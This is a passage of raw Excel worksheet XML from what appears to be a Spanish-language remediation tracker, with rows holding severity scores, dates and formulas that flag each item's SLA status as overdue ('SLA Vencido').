      </c>
      <c r="H275" t="s">
        <v>3015</v>
      </c>
      <c r="J275" t="s">
        <v>1896</v>
      </c>
      <c r="L275" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M275" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N275">
        <v>4.7</v>
      </c>
      <c r="Q275" t="s">
        <v>3016</v>
      </c>
      <c r="T275" s="1">
        <v>45864</v>
      </c>
      <c r="U275" s="76">
        <f t="shared" ca="1" si="22"/>
        <v>345</v>
      </c>
      <c r="V275" s="1">
        <f t="shared" si="23"/>
        <v>45954</v>
      </c>
      <c r="W275" s="76" t="str">
        <f t="shared" ca="1" si="24"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB275" t="s">
        <v>1896</v>
      </c>
      <c r="AC275" s="65" t="s">
        <v>1794</v>
      </c>
      <c r="AE275" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG275" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="276" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A276" s="5">
        <v>275</v>
      </c>
      <c r="B276" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C276" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D276" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G276" s="60" t="s">
        <v>2886</v>
      </c>
      <c r="H276" t="s">
        <v>3017</v>
      </c>
      <c r="J276" t="s">
        <v>1979</v>
      </c>
      <c r="L276" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M276" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N276">
        <v>4.7</v>
      </c>
      <c r="Q276" t="s">
        <v>3018</v>
      </c>
      <c r="T276" s="1">
        <v>45822</v>
      </c>
      <c r="U276" s="76">
        <f t="shared" ca="1" si="22"/>
        <v>387</v>
      </c>
      <c r="V276" s="1">
        <f t="shared" si="23"/>
        <v>45912</v>
      </c>
      <c r="W276" s="76" t="str">
        <f t="shared" ca="1" si="24"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB276" t="s">
        <v>1979</v>
      </c>
      <c r="AC276" s="65" t="s">
        <v>1980</v>
      </c>
      <c r="AE276" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG276" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="277" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A277" s="5">
        <v>276</v>
      </c>
      <c r="B277" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C277" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D277" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G277" s="60" t="s">
        <v>2886</v>
      </c>
      <c r="H277" t="s">
        <v>3019</v>
      </c>
      <c r="J277" t="s">
        <v>1979</v>
      </c>
      <c r="L277" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M277" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N277">
        <v>4.7</v>
      </c>
      <c r="Q277" t="s">
        <v>3020</v>
      </c>
      <c r="T277" s="1">
        <v>45843</v>
      </c>
      <c r="U277" s="76">
        <f t="shared" ca="1" si="22"/>
        <v>366</v>
      </c>
      <c r="V277" s="1">
        <f t="shared" si="23"/>
        <v>45933</v>
      </c>
      <c r="W277" s="76" t="str">
        <f t="shared" ca="1" si="24"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB277" t="s">
        <v>1979</v>
      </c>
      <c r="AC277" s="65" t="s">
        <v>1980</v>
      </c>
      <c r="AE277" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG277" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="278" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A278" s="5">
        <v>277</v>
      </c>
      <c r="B278" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C278" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D278" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G278" s="60" t="s">
        <v>2886</v>
      </c>
      <c r="H278" t="s">
        <v>3021</v>
      </c>
      <c r="J278" t="s">
        <v>1979</v>
      </c>
      <c r="L278" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M278" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N278">
        <v>4.7</v>
      </c>
      <c r="Q278" t="s">
        <v>3022</v>
      </c>
      <c r="T278" s="1">
        <v>45822</v>
      </c>
      <c r="U278" s="76">
        <f t="shared" ca="1" si="22"/>
        <v>387</v>
      </c>
      <c r="V278" s="1">
        <f t="shared" si="23"/>
        <v>45912</v>
      </c>
      <c r="W278" s="76" t="str">
        <f t="shared" ca="1" si="24"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB278" t="s">
        <v>1979</v>
      </c>
      <c r="AC278" s="65" t="s">
        <v>1980</v>
      </c>
      <c r="AE278" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG278" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="279" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A279" s="5">
        <v>278</v>
      </c>
      <c r="B279" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C279" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D279" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G279" s="60" t="s">
        <v>2067</v>
      </c>
      <c r="H279" t="s">
        <v>3023</v>
      </c>
      <c r="J279" t="s">
        <v>1726</v>
      </c>
      <c r="L279" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M279" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N279">
        <v>4.0999999999999996</v>
      </c>
      <c r="Q279" t="s">
        <v>2971</v>
      </c>
      <c r="T279" s="1">
        <v>45870</v>
      </c>
      <c r="U279" s="76">
        <f t="shared" ca="1" si="22"/>
        <v>339</v>
      </c>
      <c r="V279" s="1">
        <f t="shared" si="23"/>
        <v>45960</v>
      </c>
      <c r="W279" s="76" t="str">
        <f t="shared" ca="1" si="24"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB279" t="s">
        <v>1726</v>
      </c>
      <c r="AC279" s="65" t="s">
        <v>1727</v>
      </c>
      <c r="AE279" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG279" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="280" spans="1:33" ht="29" x14ac:dyDescent="0.35">
      <c r="A280" s="5">
        <v>279</v>
      </c>
      <c r="B280" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C280" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D280" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G280" s="60" t="s">
        <v>2067</v>
      </c>
      <c r="H280" t="s">
        <v>3024</v>
      </c>
      <c r="J280" t="s">
        <v>1733</v>
      </c>
      <c r="L280" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M280" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N280">
        <v>4.0999999999999996</v>
      </c>
      <c r="Q280" t="s">
        <v>2971</v>
      </c>
      <c r="T280" s="1">
        <v>45870</v>
      </c>
      <c r="U280" s="76">
        <f t="shared" ca="1" si="22"/>
        <v>339</v>
      </c>
      <c r="V280" s="1">
        <f t="shared" si="23"/>
        <v>45960</v>
      </c>
      <c r="W280" s="76" t="str">
        <f t="shared" ca="1" si="24"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB280" t="s">
        <v>1733</v>
      </c>
      <c r="AC280" s="65" t="s">
        <v>1734</v>
      </c>
      <c r="AE280" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG280" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="281" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A281" s="5">
        <v>280</v>
      </c>
      <c r="B281" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C281" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D281" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G281" s="60" t="s">
        <v>2067</v>
      </c>
      <c r="H281" t="s">
        <v>3025</v>
      </c>
      <c r="J281" t="s">
        <v>1753</v>
      </c>
      <c r="L281" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M281" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N281">
        <v>4.7</v>
      </c>
      <c r="Q281" t="s">
        <v>2800</v>
      </c>
      <c r="T281" s="1">
        <v>45897</v>
      </c>
      <c r="U281" s="76">
        <f t="shared" ca="1" si="22"/>
        <v>312</v>
      </c>
      <c r="V281" s="1">
        <f t="shared" si="23"/>
        <v>45987</v>
      </c>
      <c r="W281" s="76" t="str">
        <f t="shared" ca="1" si="24"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB281" t="s">
        <v>1753</v>
      </c>
      <c r="AC281" s="65" t="s">
        <v>1754</v>
      </c>
      <c r="AE281" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG281" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="282" spans="1:33" ht="72.5" x14ac:dyDescent="0.35">
      <c r="A282" s="5">
        <v>281</v>
      </c>
      <c r="B282" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C282" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D282" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G282" s="60" t="s">
        <v>3026</v>
      </c>
      <c r="I282" t="s">
        <v>3027</v>
      </c>
      <c r="J282" t="s">
        <v>1931</v>
      </c>
      <c r="L282" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M282" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N282">
        <v>4.8</v>
      </c>
      <c r="Q282" t="s">
        <v>1313</v>
      </c>
      <c r="T282" s="1">
        <v>45925</v>
      </c>
      <c r="U282" s="76">
        <f t="shared" ref="U282:U288" ca="1" si="25">TODAY()-T282</f>
        <v>284</v>
      </c>
      <c r="V282" s="1">
        <f t="shared" si="23"/>
        <v>46015</v>
      </c>
      <c r="W282" s="76" t="str">
        <f t="shared" ref="W282:W288" ca="1" si="26">IF(M282="Critical",IF(U282&gt;10,"SLA Vencido","En SLA"),IF(M282="High",IF(U282&gt;30,"SLA Vencido","En SLA"),IF(M282="Bad",IF(U282&gt;30,"SLA Vencido","En SLA"),IF(M282="Medium",IF(U282&gt;90,"SLA Vencido","En SLA"),IF(M282="Warm",IF(U282&gt;90,"SLA Vencido","En SLA"),IF(M282="Low",IF(U282&gt;120,"SLA Vencido","En SLA"),IF(M282="Fair",IF(U282&gt;120,"SLA Vencido","En SLA"),IF(M282="Neutral",IF(U282&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>SLA Vencido</v>
      </c>
      <c r="AB282" s="65" t="s">
        <v>3028</v>
      </c>
      <c r="AC282" s="65" t="s">
        <v>3029</v>
      </c>
      <c r="AD282" s="65" t="s">
        <v>3029</v>
      </c>
      <c r="AE282" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG282" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="283" spans="1:33" ht="116" x14ac:dyDescent="0.35">
      <c r="A283" s="5">
        <v>282</v>
      </c>
      <c r="B283" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C283" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D283" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G283" s="60" t="s">
        <v>3026</v>
      </c>
      <c r="I283" t="s">
        <v>3030</v>
      </c>
      <c r="J283" t="s">
        <v>1928</v>
      </c>
      <c r="L283" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M283" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N283">
        <v>4.8</v>
      </c>
      <c r="Q283" t="s">
        <v>1313</v>
      </c>
      <c r="T283" s="1">
        <v>45925</v>
      </c>
      <c r="U283" s="76">
        <f t="shared" ca="1" si="25"/>
        <v>284</v>
      </c>
      <c r="V283" s="1">
        <f t="shared" ref="V283:V284" si="27">IF(M283="Critical",T283+10,IF(M283="High",T283+30,IF(M283="Bad",T283+30,IF(M283="Medium",T283+90,IF(M283="Warm",T283+90,IF(M283="Low",T283+120,IF(M283="Fair",T283+120,IF(M283="Neutral",T283+120,""))))))))</f>
        <v>46015</v>
      </c>
      <c r="W283" s="76" t="str">
        <f t="shared" ca="1" si="26"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB283" s="65" t="s">
        <v>3031</v>
      </c>
      <c r="AC283" s="65" t="s">
        <v>1992</v>
      </c>
      <c r="AD283" s="65" t="s">
        <v>3032</v>
      </c>
      <c r="AE283" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG283" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="284" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A284" s="5">
        <v>283</v>
      </c>
      <c r="B284" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C284" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D284" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G284" s="60" t="s">
        <v>2067</v>
      </c>
      <c r="H284" t="s">
        <v>3033</v>
      </c>
      <c r="I284" t="s">
        <v>3499</v>
      </c>
      <c r="J284" t="s">
        <v>80</v>
      </c>
      <c r="L284" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M284" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N284">
        <v>5.0999999999999996</v>
      </c>
      <c r="Q284" t="s">
        <v>2089</v>
      </c>
      <c r="T284" s="1">
        <v>45938</v>
      </c>
      <c r="U284" s="76">
        <f t="shared" ca="1" si="25"/>
        <v>271</v>
      </c>
      <c r="V284" s="1">
        <f t="shared" si="27"/>
        <v>46028</v>
      </c>
      <c r="W284" s="76" t="str">
        <f t="shared" ca="1" si="26"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB284" t="s">
        <v>3034</v>
      </c>
      <c r="AC284" t="s">
        <v>3035</v>
      </c>
      <c r="AE284" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG284" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="285" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A285" s="5">
        <v>284</v>
      </c>
      <c r="B285" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C285" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D285" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G285" s="60" t="s">
        <v>2067</v>
      </c>
      <c r="H285" t="s">
        <v>3036</v>
      </c>
      <c r="I285" t="s">
        <v>3500</v>
      </c>
      <c r="J285" t="s">
        <v>2122</v>
      </c>
      <c r="L285" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M285" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N285">
        <v>6.4</v>
      </c>
      <c r="Q285" t="s">
        <v>2089</v>
      </c>
      <c r="T285" s="1">
        <v>45938</v>
      </c>
      <c r="U285" s="76">
        <f t="shared" ca="1" si="25"/>
        <v>271</v>
      </c>
      <c r="V285" s="1">
        <f t="shared" ref="V285:V286" si="28">IF(M285="Critical",T285+10,IF(M285="High",T285+30,IF(M285="Bad",T285+30,IF(M285="Medium",T285+90,IF(M285="Warm",T285+90,IF(M285="Low",T285+120,IF(M285="Fair",T285+120,IF(M285="Neutral",T285+120,""))))))))</f>
        <v>46028</v>
      </c>
      <c r="W285" s="76" t="str">
        <f t="shared" ca="1" si="26"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB285" t="s">
        <v>3037</v>
      </c>
      <c r="AC285" t="s">
        <v>3038</v>
      </c>
      <c r="AE285" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG285" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="286" spans="1:33" ht="87" x14ac:dyDescent="0.35">
      <c r="A286" s="5">
        <v>285</v>
      </c>
      <c r="B286" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C286" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D286" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G286" s="60" t="s">
        <v>2045</v>
      </c>
      <c r="I286" t="s">
        <v>3039</v>
      </c>
      <c r="J286" t="s">
        <v>1042</v>
      </c>
      <c r="L286" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M286" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N286">
        <v>3.7</v>
      </c>
      <c r="Q286" s="65" t="s">
        <v>3040</v>
      </c>
      <c r="T286" s="1">
        <v>45951</v>
      </c>
      <c r="U286" s="76">
        <f t="shared" ca="1" si="25"/>
        <v>258</v>
      </c>
      <c r="V286" s="1">
        <f t="shared" si="28"/>
        <v>46071</v>
      </c>
      <c r="W286" s="76" t="str">
        <f t="shared" ca="1" si="26"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB286" s="65" t="s">
        <v>3041</v>
      </c>
      <c r="AC286" s="65" t="s">
        <v>3042</v>
      </c>
      <c r="AD286" s="65" t="s">
        <v>3043</v>
      </c>
      <c r="AE286" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG286" s="51" t="s">
        <v>3044</v>
      </c>
    </row>
    <row r="287" spans="1:33" ht="116" x14ac:dyDescent="0.35">
      <c r="A287" s="5">
        <v>286</v>
      </c>
      <c r="B287" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C287" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D287" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G287" s="60" t="s">
        <v>2045</v>
      </c>
      <c r="I287" t="s">
        <v>3045</v>
      </c>
      <c r="J287" t="s">
        <v>3046</v>
      </c>
      <c r="L287" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M287" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N287">
        <v>3.1</v>
      </c>
      <c r="Q287" s="65" t="s">
        <v>3040</v>
      </c>
      <c r="T287" s="1">
        <v>45951</v>
      </c>
      <c r="U287" s="76">
        <f t="shared" ca="1" si="25"/>
        <v>258</v>
      </c>
      <c r="V287" s="1">
        <f t="shared" ref="V287" si="29">IF(M287="Critical",T287+10,IF(M287="High",T287+30,IF(M287="Bad",T287+30,IF(M287="Medium",T287+90,IF(M287="Warm",T287+90,IF(M287="Low",T287+120,IF(M287="Fair",T287+120,IF(M287="Neutral",T287+120,""))))))))</f>
        <v>46071</v>
      </c>
      <c r="W287" s="76" t="str">
        <f t="shared" ca="1" si="26"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB287" s="65" t="s">
        <v>3047</v>
      </c>
      <c r="AC287" s="65" t="s">
        <v>3048</v>
      </c>
      <c r="AD287" s="65" t="s">
        <v>3049</v>
      </c>
      <c r="AE287" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG287" s="51" t="s">
        <v>3044</v>
      </c>
    </row>
    <row r="288" spans="1:33" ht="87" x14ac:dyDescent="0.35">
      <c r="A288" s="5">
        <v>287</v>
      </c>
      <c r="B288" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C288" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D288" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G288" s="60" t="s">
        <v>2103</v>
      </c>
      <c r="H288" t="s">
        <v>3050</v>
      </c>
      <c r="I288" t="s">
        <v>3051</v>
      </c>
      <c r="J288" t="s">
        <v>870</v>
      </c>
      <c r="L288" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M288" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N288">
        <v>4.2</v>
      </c>
      <c r="Q288" t="s">
        <v>2107</v>
      </c>
      <c r="T288" s="1">
        <v>45951</v>
      </c>
      <c r="U288" s="76">
        <f t="shared" ca="1" si="25"/>
        <v>258</v>
      </c>
      <c r="V288" s="1">
        <f t="shared" ref="V288" si="30">IF(M288="Critical",T288+10,IF(M288="High",T288+30,IF(M288="Bad",T288+30,IF(M288="Medium",T288+90,IF(M288="Warm",T288+90,IF(M288="Low",T288+120,IF(M288="Fair",T288+120,IF(M288="Neutral",T288+120,""))))))))</f>
        <v>46041</v>
      </c>
      <c r="W288" s="76" t="str">
        <f t="shared" ca="1" si="26"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB288" s="65" t="s">
        <v>3052</v>
      </c>
      <c r="AC288" s="65" t="s">
        <v>3053</v>
      </c>
      <c r="AD288" s="65" t="s">
        <v>3054</v>
      </c>
      <c r="AE288" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG288" s="51" t="s">
        <v>1179</v>
      </c>
    </row>
    <row r="289" spans="1:33" ht="130.5" x14ac:dyDescent="0.35">
      <c r="A289" s="5">
        <v>288</v>
      </c>
      <c r="B289" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C289" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D289" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G289" s="60" t="s">
        <v>2061</v>
      </c>
      <c r="I289" t="s">
        <v>3055</v>
      </c>
      <c r="J289" t="s">
        <v>1760</v>
      </c>
      <c r="L289" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M289" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N289">
        <v>3.1</v>
      </c>
      <c r="Q289" t="s">
        <v>2077</v>
      </c>
      <c r="T289" s="1">
        <v>45953</v>
      </c>
      <c r="U289" s="76">
        <f t="shared" ref="U289" ca="1" si="31">TODAY()-T289</f>
        <v>256</v>
      </c>
      <c r="V289" s="1">
        <f t="shared" ref="V289" si="32">IF(M289="Critical",T289+10,IF(M289="High",T289+30,IF(M289="Bad",T289+30,IF(M289="Medium",T289+90,IF(M289="Warm",T289+90,IF(M289="Low",T289+120,IF(M289="Fair",T289+120,IF(M289="Neutral",T289+120,""))))))))</f>
        <v>46073</v>
      </c>
      <c r="W289" s="76" t="str">
        <f t="shared" ref="W289" ca="1" si="33">IF(M289="Critical",IF(U289&gt;10,"SLA Vencido","En SLA"),IF(M289="High",IF(U289&gt;30,"SLA Vencido","En SLA"),IF(M289="Bad",IF(U289&gt;30,"SLA Vencido","En SLA"),IF(M289="Medium",IF(U289&gt;90,"SLA Vencido","En SLA"),IF(M289="Warm",IF(U289&gt;90,"SLA Vencido","En SLA"),IF(M289="Low",IF(U289&gt;120,"SLA Vencido","En SLA"),IF(M289="Fair",IF(U289&gt;120,"SLA Vencido","En SLA"),IF(M289="Neutral",IF(U289&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>SLA Vencido</v>
      </c>
      <c r="AB289" s="65" t="s">
        <v>3056</v>
      </c>
      <c r="AC289" s="65" t="s">
        <v>3057</v>
      </c>
      <c r="AD289" s="65" t="s">
        <v>3058</v>
      </c>
      <c r="AE289" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG289" s="51" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="290" spans="1:33" ht="130.5" x14ac:dyDescent="0.35">
      <c r="A290" s="5">
        <v>289</v>
      </c>
      <c r="B290" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C290" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D290" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G290" s="60" t="s">
        <v>2053</v>
      </c>
      <c r="H290" t="s">
        <v>3059</v>
      </c>
      <c r="I290" t="s">
        <v>3060</v>
      </c>
      <c r="J290" t="s">
        <v>1826</v>
      </c>
      <c r="L290" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M290" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N290">
        <v>6.5</v>
      </c>
      <c r="Q290" s="65" t="s">
        <v>3061</v>
      </c>
      <c r="T290" s="1">
        <v>45953</v>
      </c>
      <c r="U290" s="76">
        <f t="shared" ref="U290:U296" ca="1" si="34">TODAY()-T290</f>
        <v>256</v>
      </c>
      <c r="V290" s="1">
        <f t="shared" ref="V290:V296" si="35">IF(M290="Critical",T290+10,IF(M290="High",T290+30,IF(M290="Bad",T290+30,IF(M290="Medium",T290+90,IF(M290="Warm",T290+90,IF(M290="Low",T290+120,IF(M290="Fair",T290+120,IF(M290="Neutral",T290+120,""))))))))</f>
        <v>46043</v>
      </c>
      <c r="W290" s="76" t="str">
        <f t="shared" ref="W290:W296" ca="1" si="36">IF(M290="Critical",IF(U290&gt;10,"SLA Vencido","En SLA"),IF(M290="High",IF(U290&gt;30,"SLA Vencido","En SLA"),IF(M290="Bad",IF(U290&gt;30,"SLA Vencido","En SLA"),IF(M290="Medium",IF(U290&gt;90,"SLA Vencido","En SLA"),IF(M290="Warm",IF(U290&gt;90,"SLA Vencido","En SLA"),IF(M290="Low",IF(U290&gt;120,"SLA Vencido","En SLA"),IF(M290="Fair",IF(U290&gt;120,"SLA Vencido","En SLA"),IF(M290="Neutral",IF(U290&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>SLA Vencido</v>
      </c>
      <c r="AB290" s="65" t="s">
        <v>3062</v>
      </c>
      <c r="AC290" s="65" t="s">
        <v>3063</v>
      </c>
      <c r="AD290" s="65" t="s">
        <v>3064</v>
      </c>
      <c r="AE290" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG290" s="51" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="291" spans="1:33" ht="87" x14ac:dyDescent="0.35">
      <c r="A291" s="5">
        <v>290</v>
      </c>
      <c r="B291" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C291" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D291" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G291" s="60" t="s">
        <v>2053</v>
      </c>
      <c r="H291" t="s">
        <v>3065</v>
      </c>
      <c r="I291" t="s">
        <v>3066</v>
      </c>
      <c r="J291" t="s">
        <v>421</v>
      </c>
      <c r="L291" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M291" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N291">
        <v>5.0999999999999996</v>
      </c>
      <c r="Q291" s="65" t="s">
        <v>3061</v>
      </c>
      <c r="T291" s="1">
        <v>45953</v>
      </c>
      <c r="U291" s="76">
        <f t="shared" ca="1" si="34"/>
        <v>256</v>
      </c>
      <c r="V291" s="1">
        <f t="shared" si="35"/>
        <v>46043</v>
      </c>
      <c r="W291" s="76" t="str">
        <f t="shared" ca="1" si="36"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB291" s="65" t="s">
        <v>3067</v>
      </c>
      <c r="AC291" s="65" t="s">
        <v>3068</v>
      </c>
      <c r="AD291" s="65" t="s">
        <v>3069</v>
      </c>
      <c r="AE291" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG291" s="51" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="292" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A292" s="5">
        <v>291</v>
      </c>
      <c r="B292" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C292" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D292" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G292" s="60" t="s">
        <v>2053</v>
      </c>
      <c r="H292" t="s">
        <v>3070</v>
      </c>
      <c r="I292" t="s">
        <v>3071</v>
      </c>
      <c r="J292" t="s">
        <v>91</v>
      </c>
      <c r="L292" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M292" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N292">
        <v>4.5999999999999996</v>
      </c>
      <c r="Q292" s="65" t="s">
        <v>3061</v>
      </c>
      <c r="T292" s="1">
        <v>45953</v>
      </c>
      <c r="U292" s="76">
        <f t="shared" ca="1" si="34"/>
        <v>256</v>
      </c>
      <c r="V292" s="1">
        <f t="shared" si="35"/>
        <v>46043</v>
      </c>
      <c r="W292" s="76" t="str">
        <f t="shared" ca="1" si="36"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB292" s="65" t="s">
        <v>3072</v>
      </c>
      <c r="AC292" s="65" t="s">
        <v>3073</v>
      </c>
      <c r="AD292" s="65" t="s">
        <v>3074</v>
      </c>
      <c r="AE292" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG292" s="51" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="293" spans="1:33" ht="130.5" x14ac:dyDescent="0.35">
      <c r="A293" s="5">
        <v>292</v>
      </c>
      <c r="B293" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C293" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D293" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G293" s="60" t="s">
        <v>2053</v>
      </c>
      <c r="I293" t="s">
        <v>3075</v>
      </c>
      <c r="J293" t="s">
        <v>1271</v>
      </c>
      <c r="L293" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M293" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N293">
        <v>3.8</v>
      </c>
      <c r="Q293" s="65" t="s">
        <v>3076</v>
      </c>
      <c r="T293" s="1">
        <v>45953</v>
      </c>
      <c r="U293" s="76">
        <f t="shared" ca="1" si="34"/>
        <v>256</v>
      </c>
      <c r="V293" s="1">
        <f t="shared" si="35"/>
        <v>46073</v>
      </c>
      <c r="W293" s="76" t="str">
        <f t="shared" ca="1" si="36"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB293" s="65" t="s">
        <v>3077</v>
      </c>
      <c r="AC293" s="65" t="s">
        <v>3078</v>
      </c>
      <c r="AD293" s="65" t="s">
        <v>3079</v>
      </c>
      <c r="AE293" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG293" s="51" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="294" spans="1:33" ht="87" x14ac:dyDescent="0.35">
      <c r="A294" s="5">
        <v>293</v>
      </c>
      <c r="B294" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C294" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D294" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G294" s="60" t="s">
        <v>2053</v>
      </c>
